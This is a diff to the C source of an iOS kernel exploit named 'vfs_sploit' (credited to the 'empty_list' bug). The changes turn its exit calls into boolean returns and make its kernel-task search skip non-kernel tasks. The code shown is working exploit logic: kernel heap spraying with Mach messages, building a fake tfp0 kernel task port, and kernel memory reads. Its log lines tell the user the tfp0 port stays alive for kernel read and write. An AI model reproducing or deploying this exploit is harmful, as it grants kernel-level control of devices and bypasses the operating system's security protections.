@@ -220,7 +220,7 @@ mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messa
                                        MACH_PORT_LIMITS_INFO_COUNT);
         if (err != KERN_SUCCESS) {
             LOG("failed to increase queue limit\n");
-            exit(EXIT_FAILURE);
+            return false;
         }
     } else {
         port = holder_port;
@@ -262,7 +262,7 @@ mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messa
                        MACH_PORT_NULL);
         if (err != KERN_SUCCESS) {
             LOG("%s\n", mach_error_string(err));
-            //exit(EXIT_FAILURE);
+            //return false;
         }
     }
     free(ports_to_send);
@@ -392,7 +392,7 @@ uint64_t early_rk64(uint64_t kaddr) {
     return final;
 }
 
-void vfs_sploit() {
+bool vfs_sploit() {
     LOG("empty_list by @i41nbeer\n");
     offsets_init();
     
@@ -408,7 +408,7 @@ void vfs_sploit() {
         LOG("this device uses 4k kernel pages\n");
     } else {
         LOG("this device uses an unsupported kernel page size\n");
-        exit(EXIT_FAILURE);
+        return false;
     }
     
     
@@ -838,7 +838,7 @@ void vfs_sploit() {
                    MACH_PORT_NULL);
     if (err != KERN_SUCCESS) {
         LOG("failed to send host message to canary port %s\n", mach_error_string(err));
-        //exit(EXIT_FAILURE);
+        //return false;
     }
     LOG("sent host_msg to canary port, let's find it and locate the host port\n");
     
@@ -865,7 +865,7 @@ void vfs_sploit() {
                    MACH_PORT_NULL);
     if (err != KERN_SUCCESS) {
         LOG("failed to send host message to canary port %s\n", mach_error_string(err));
-        //exit(EXIT_FAILURE);
+        //return false;
     }
     LOG("sent task_msg to canary port, let's find it and locate the host port\n");
     
@@ -932,6 +932,7 @@ void vfs_sploit() {
         uint32_t pid = early_rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
         if (pid != 0) {
             LOG("task isn't the kernel task\n");
+            continue;
         }
         
         // found the right task, get the vm_map
@@ -978,8 +979,7 @@ void vfs_sploit() {
     err = mach_vm_read(fake_tfp0, kernel_vm_map, 0x40, &data_out, &out_size);
     if (err != KERN_SUCCESS) {
         LOG("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
-        sleep(3);
-        exit(EXIT_FAILURE);
+        return false;
     }
     
     LOG("kernel read via second tfp0 port worked?\n");
@@ -1057,4 +1057,5 @@ void vfs_sploit() {
     LOG("use the functions in kmem.h to read and write kernel memory\n");
     LOG("tfp0 in there will stay alive once this process exits\n");
     LOG("keep hold of a send right to it; don't expect this exploit to work again without a reboot\n");
+    return true;
 }
